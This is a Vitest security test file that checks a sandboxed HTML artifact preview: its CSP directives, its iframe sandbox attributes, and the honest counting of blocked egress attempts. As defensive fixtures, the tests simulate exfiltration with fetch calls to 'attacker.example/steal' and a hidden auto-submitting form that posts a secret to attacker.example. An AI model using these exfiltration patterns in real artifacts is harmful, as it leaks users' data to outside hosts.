// @vitest-environment jsdom
//
// ===========================================================================
// Task 8 — MANDATORY focused security check for the Private On-Device Artifacts
// egress restriction (Req 4) and its HONEST runtime verification (Req 5).
//
// SCOPE / WHAT THESE TESTS DO AND DO NOT PROVE
// -------------------------------------------------------------------------
// jsdom does NOT enforce Content-Security-Policy and does NOT actually block
// network access. So these tests do NOT prove the browser blocks anything —
// the REAL prevention is the CSP + opaque-origin sandbox of design §5, which is
// asserted here structurally (the exact constants + the attributes on the
// rendered <iframe>) and must be confirmed in a real browser (see the manual
// verification note at the bottom of this file).
//
// What these tests DO prove is the load-bearing HONESTY of the §6 verification
// layer:
//   (a) the exact prevention contract is present (PREVIEW_CSP / PREVIEW_SANDBOX
//       and the rendered iframe carry all five 'none' directives + allow-scripts
//       without allow-same-origin), and
//   (b) the in-sandbox COUNTING logic only counts a sink attempt as "blocked"
//       when the underlying call ACTUALLY fails/rejects/is-prevented, and NEVER
//       when it succeeds — so the indicator can never lie about "0 verified"
//       even if the CSP were ever loosened, and
//   (c) the host-side mapping turns those counts into the honest EgressStatus.
// ===========================================================================

import { describe, it, expect, afterEach } from "vitest";
import { JSDOM } from "jsdom";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import {
  PREVIEW_CSP,
  PREVIEW_SANDBOX,
  buildBootstrapScript,
  buildHtmlSrcDoc,
  deriveEgressStatus,
  ArtifactPreview,
} from "./ArtifactPreview";
import type { ParseResult } from "../lib/artifactParser";

const EGRESS_MARKER = "__tokenquick_egress";

// The five non-negotiable prevention directives (design §5, Property 5).
const REQUIRED_CSP_DIRECTIVES = [
  "default-src 'none'",
  "connect-src 'none'",
  "form-action 'none'",
  "frame-ancestors 'none'",
  "base-uri 'none'",
];

// ---------------------------------------------------------------------------
// Harness: stand up an isolated jsdom Window, install the in-sandbox bootstrap
// into it, and capture every handshake/telemetry postMessage the bootstrap
// emits to `window.parent`. We use `runScripts: "outside-only"` so the DOM's
// own <script> tags do NOT auto-execute; instead we control WHEN the bootstrap
// runs (via win.eval) and what globals (fetch, etc.) it captures — that is what
// lets us simulate a REJECTING vs a RESOLVING fetch.
// ---------------------------------------------------------------------------
interface Sandbox {
  win: any;
  messages: any[];
  // Latest blockedCount reported to the host, or -1 if no handshake yet.
  lastBlockedCount(): number;
  // Run the bootstrap IIFE inside this window (captures current globals).
  installBootstrap(): void;
  close(): void;
}

function makeSandbox(): Sandbox {
  const dom = new JSDOM("<!DOCTYPE html><html><head></head><body></body></html>", {
    runScripts: "outside-only",
    url: "https://sandbox.example/",
  });
  const win: any = dom.window;
  const messages: any[] = [];

  // The bootstrap posts to `window.parent`. In a standalone jsdom document
  // `window.parent === window`, so intercept postMessage on the window itself
  // and record the egress-marked payloads synchronously.
  const originalPostMessage = win.postMessage.bind(win);
  win.parent = win;
  win.postMessage = function (data: any) {
    if (data && data[EGRESS_MARKER] === true) messages.push(data);
    // do not forward to the real (async) postMessage — we assert synchronously
    return undefined;
  };
  // keep a reference so we never accidentally break the window's own messaging
  void originalPostMessage;

  return {
    win,
    messages,
    lastBlockedCount() {
      if (messages.length === 0) return -1;
      return messages[messages.length - 1].blockedCount;
    },
    installBootstrap() {
      // Execute the EXACT runtime bootstrap string inside this window.
      win.eval(buildBootstrapScript());
    },
    close() {
      dom.window.close();
    },
  };
}

// =========================================================================
// 1. CSP + sandbox attribute (Req 4.1-4.4, design §5 / Property 5)
// =========================================================================
describe("prevention contract: CSP + sandbox attribute (Req 4.1-4.4)", () => {
  it("PREVIEW_SANDBOX is allow-scripts WITHOUT allow-same-origin", () => {
    expect(PREVIEW_SANDBOX).toBe("allow-scripts");
    // The combination allow-scripts + allow-same-origin lets a frame remove its
    // own sandbox — it must NEVER appear.
    expect(PREVIEW_SANDBOX).not.toContain("allow-same-origin");
  });

  it("PREVIEW_CSP contains all five non-inheriting 'none' directives", () => {
    for (const directive of REQUIRED_CSP_DIRECTIVES) {
      expect(PREVIEW_CSP, `missing directive: ${directive}`).toContain(directive);
    }
  });

  it("buildHtmlSrcDoc injects the CSP <meta> with all five directives", () => {
    const srcDoc = buildHtmlSrcDoc("<h1>hi</h1>");
    expect(srcDoc).toContain('http-equiv="Content-Security-Policy"');
    for (const directive of REQUIRED_CSP_DIRECTIVES) {
      expect(srcDoc).toContain(directive);
    }
  });

  it("rendered <ArtifactPreview> for a CLOSED html artifact emits an iframe with allow-scripts (no allow-same-origin) and the CSP meta", () => {
    const report: ParseResult = {
      state: "CLOSED",
      lang: "html",
      primaryCode: "<h1>Hello</h1>",
      primaryClosed: true,
      extraBlocks: [],
      sawAnyMarker: true,
    };
    // Use createElement (not JSX) to avoid depending on a JSX runtime in the
    // test transform; the rendered output is identical.
    const html = renderToStaticMarkup(
      createElement(ArtifactPreview, { report, streamEnded: true })
    );

    // Parse the rendered output so we assert on real attributes, not substrings.
    const frag = JSDOM.fragment(html);
    const iframe = frag.querySelector("iframe");
    expect(iframe, "expected an <iframe> preview to render").not.toBeNull();

    const sandbox = iframe!.getAttribute("sandbox");
    expect(sandbox).toBe("allow-scripts");
    expect(sandbox).not.toContain("allow-same-origin");

    // React renders srcDoc onto the `srcdoc` attribute.
    const srcDoc = iframe!.getAttribute("srcdoc") ?? "";
    expect(srcDoc).toContain('http-equiv="Content-Security-Policy"');
    for (const directive of REQUIRED_CSP_DIRECTIVES) {
      expect(srcDoc, `iframe srcDoc missing: ${directive}`).toContain(directive);
    }
  });
});

// =========================================================================
// 2. fetch: FAILURE is counted, SUCCESS is NOT counted (Req 5.2, 5.3).
//    This is the load-bearing honesty invariant of the corrected counting
//    logic: a blocked attempt bumps the counter ONLY when the underlying call
//    actually rejects; a call that succeeds must never be miscounted.
// =========================================================================
describe("fetch wrapper counts ONLY real failures (Req 5.2, 5.3)", () => {
  let sb: Sandbox;
  afterEach(() => sb?.close());

  it("a fetch whose promise REJECTS is counted as a blocked attempt", async () => {
    sb = makeSandbox();
    // Install a fetch that always rejects (simulating a CSP-blocked request).
    sb.win.fetch = () => Promise.reject(new Error("blocked by CSP"));
    sb.installBootstrap();

    // Handshake fired immediately with the zero baseline.
    expect(sb.messages.length).toBeGreaterThanOrEqual(1);
    expect(sb.lastBlockedCount()).toBe(0);

    // The artifact calls fetch(); the promise rejects → wrapper must bump.
    await sb.win.fetch("https://attacker.example/steal").then(
      () => {
        throw new Error("fetch should have rejected in this scenario");
      },
      () => {
        /* expected rejection */
      }
    );

    expect(sb.lastBlockedCount()).toBeGreaterThanOrEqual(1);
  });

  it("a fetch whose promise RESOLVES is NOT counted (honesty: success is never miscounted)", async () => {
    sb = makeSandbox();
    // Hypothetical: the environment ALLOWS the call and it succeeds. Even so,
    // the wrapper must NOT count it as blocked — otherwise the indicator would
    // lie if the CSP were ever loosened.
    sb.win.fetch = () => Promise.resolve({ ok: true, status: 200 });
    sb.installBootstrap();

    expect(sb.lastBlockedCount()).toBe(0); // baseline handshake

    const res = await sb.win.fetch("https://example.com/ok");
    expect(res.ok).toBe(true);

    // Give any (incorrect) async bump a chance to fire, then assert it did NOT.
    await Promise.resolve();
    expect(sb.lastBlockedCount()).toBe(0);
  });

  it("a fetch that throws SYNCHRONOUSLY is counted as blocked", async () => {
    sb = makeSandbox();
    sb.win.fetch = () => {
      throw new Error("synchronous SecurityError");
    };
    sb.installBootstrap();
    expect(sb.lastBlockedCount()).toBe(0);

    // The wrapper turns a synchronous throw into a rejected promise AND bumps.
    await sb.win.fetch("https://attacker.example").then(
      () => {
        throw new Error("expected rejection");
      },
      () => {}
    );
    expect(sb.lastBlockedCount()).toBeGreaterThanOrEqual(1);
  });
});

// =========================================================================
// 3. Auto-submitting form: blocked (preventDefault) AND reported via the SAME
//    counter path as fetch (Req 4.2, 5.2). Plus the CSP-level path: a
//    securitypolicyviolation for form-action is also counted.
// =========================================================================
describe("form-submission / navigation vector is blocked AND counted (Req 4.2, 5.2)", () => {
  let sb: Sandbox;
  afterEach(() => sb?.close());

  it("capture-phase interceptor preventDefault()s an auto-submitting external form AND counts it", () => {
    sb = makeSandbox();
    sb.installBootstrap();
    const baseline = sb.lastBlockedCount();
    expect(baseline).toBe(0);

    const doc = sb.win.document;
    const form = doc.createElement("form");
    form.setAttribute("action", "https://attacker.example");
    form.setAttribute("method", "POST");
    const hidden = doc.createElement("input");
    hidden.setAttribute("type", "hidden");
    hidden.setAttribute("name", "secret");
    hidden.setAttribute("value", "exfiltrate-me");
    form.appendChild(hidden);
    doc.body.appendChild(form);

    // Dispatch a cancelable submit event (mirrors form.submit()/auto-submit on
    // load). Assert the capture-phase listener prevented the default action.
    const submitEvent = new sb.win.Event("submit", {
      bubbles: true,
      cancelable: true,
    });
    form.dispatchEvent(submitEvent);

    // The submission was prevented (it never navigates/leaves the sandbox)...
    expect(submitEvent.defaultPrevented).toBe(true);
    // ...and it was reported through the SAME blockedCount/postMessage path.
    expect(sb.lastBlockedCount()).toBeGreaterThanOrEqual(1);
  });

  it("a securitypolicyviolation with a form-action violatedDirective is counted (CSP-level path)", () => {
    sb = makeSandbox();
    sb.installBootstrap();
    expect(sb.lastBlockedCount()).toBe(0);

    // Simulate the browser's CSP-level report for a blocked form submission.
    const evt: any = new sb.win.Event("securitypolicyviolation");
    evt.violatedDirective = "form-action";
    evt.effectiveDirective = "form-action";
    sb.win.dispatchEvent(evt);

    expect(sb.lastBlockedCount()).toBeGreaterThanOrEqual(1);
  });

  it("a securitypolicyviolation for connect-src (network sink) is counted too", () => {
    sb = makeSandbox();
    sb.installBootstrap();
    expect(sb.lastBlockedCount()).toBe(0);

    const evt: any = new sb.win.Event("securitypolicyviolation");
    evt.violatedDirective = "connect-src";
    sb.win.dispatchEvent(evt);

    expect(sb.lastBlockedCount()).toBeGreaterThanOrEqual(1);
  });
});

// =========================================================================
// 4. Host-side derivation of the honest EgressStatus from the handshake message
//    shape { __tokenquick_egress: true, listenerActive, blockedCount }
//    (Req 5.1-5.5, design §6 / Property 6).
// =========================================================================
describe("host mapping deriveEgressStatus (Req 5.1-5.5)", () => {
  it("live handshake with blockedCount 0 → verified-zero", () => {
    const status = deriveEgressStatus({
      [EGRESS_MARKER]: true,
      listenerActive: true,
      blockedCount: 0,
    });
    expect(status).toEqual({ mode: "verified-zero", blockedCount: 0 });
  });

  it("blockedCount >= 1 → blocked (with the count preserved)", () => {
    const status = deriveEgressStatus({
      [EGRESS_MARKER]: true,
      listenerActive: true,
      blockedCount: 3,
    });
    expect(status).toEqual({ mode: "blocked", blockedCount: 3 });
  });

  it("no handshake (missing/foreign message) → null ⇒ host stays configured-only", () => {
    // A message without the marker is ignored (not our handshake).
    expect(deriveEgressStatus({ blockedCount: 5 } as any)).toBeNull();
    expect(deriveEgressStatus(null)).toBeNull();
    expect(deriveEgressStatus(undefined)).toBeNull();
    // Marker present but no listenerActive and zero count ⇒ not yet verified.
    expect(
      deriveEgressStatus({ [EGRESS_MARKER]: true, blockedCount: 0 } as any)
    ).toBeNull();
  });

  it("end-to-end: a real in-sandbox handshake maps to verified-zero on the host", () => {
    const sb = makeSandbox();
    try {
      sb.installBootstrap();
      const msg = sb.messages[sb.messages.length - 1];
      // The message has exactly the documented shape.
      expect(msg[EGRESS_MARKER]).toBe(true);
      expect(msg.listenerActive).toBe(true);
      expect(msg.blockedCount).toBe(0);
      // And the host derivation upgrades it to verified-zero.
      expect(deriveEgressStatus(msg)).toEqual({
        mode: "verified-zero",
        blockedCount: 0,
      });
    } finally {
      sb.close();
    }
  });

  it("end-to-end: after a blocked fetch, the handshake maps to blocked on the host", async () => {
    const sb = makeSandbox();
    try {
      sb.win.fetch = () => Promise.reject(new Error("blocked"));
      sb.installBootstrap();
      await sb.win.fetch("https://attacker.example").then(
        () => {
          throw new Error("expected rejection");
        },
        () => {}
      );
      const msg = sb.messages[sb.messages.length - 1];
      const status = deriveEgressStatus(msg)!;
      expect(status.mode).toBe("blocked");
      expect(status.blockedCount).toBeGreaterThanOrEqual(1);
    } finally {
      sb.close();
    }
  });
});

// ===========================================================================
// MANUAL BROWSER VERIFICATION (the REAL prevention — jsdom cannot enforce it)
// ---------------------------------------------------------------------------
// jsdom does not enforce CSP or block network, so the tests above validate the
// honest COUNTING/REPORTING logic and the structural prevention contract only.
// To verify the browser ACTUALLY blocks egress:
//   1. Run the app, enable the Live Preview stage, and generate an `html`
//      artifact whose body does `<script>fetch("https://example.com")</script>`.
//   2. Open DevTools → Network: confirm NO request leaves for example.com, and
//      Console shows a CSP `connect-src 'none'` violation. The indicator should
//      read "blocked 1 outbound attempt".
//   3. Repeat with a hidden auto-submitting <form action="https://attacker...">
//      + <script>document.forms[0].submit()</script>: confirm NO navigation /
//      no request leaves (blocked by `form-action 'none'` + the capture-phase
//      interceptor) and the indicator reports a blocked attempt.
//   4. A clean artifact making no calls should read "0 outbound calls (verified)".
// ===========================================================================
